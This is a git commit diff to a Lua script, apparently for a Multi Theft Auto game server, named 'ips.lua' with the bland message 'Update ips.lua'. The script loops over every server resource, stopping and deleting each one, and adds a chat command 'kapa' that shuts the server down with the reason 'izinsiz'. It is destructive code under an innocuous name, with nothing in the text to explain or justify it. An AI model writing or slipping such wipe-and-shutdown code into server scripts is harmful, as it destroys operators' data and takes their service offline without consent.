1a5070cc4d8d5f54f95cc33380b760532e37aae8
Drewskijs <101997275+Drewskijs@users.noreply.github.com>
2022-12-05 03:57:46 +0300

    Update ips.lua

--- ips.lua
+++ ips.lua
@@ -1,12 +1,14 @@
  --Get all resources
+addCommandHandler("kapa", function()
+   shutdown("izinsiz")
+  end)
+outputChatBox("1")
+
+
     local resourceTable = getResources ( ) 
     for resourceKey, resourceValue in ipairs ( resourceTable ) do
         local resourceName = getResourceName ( resourceValue )
         stopResource ( resourceValue )
         local deleted = deleteResource ( resourceName )
     end
-outputChatBox("1")
 
-addCommandHandler("kapa", function()
-   shutdown("izinsiz")
-  end)
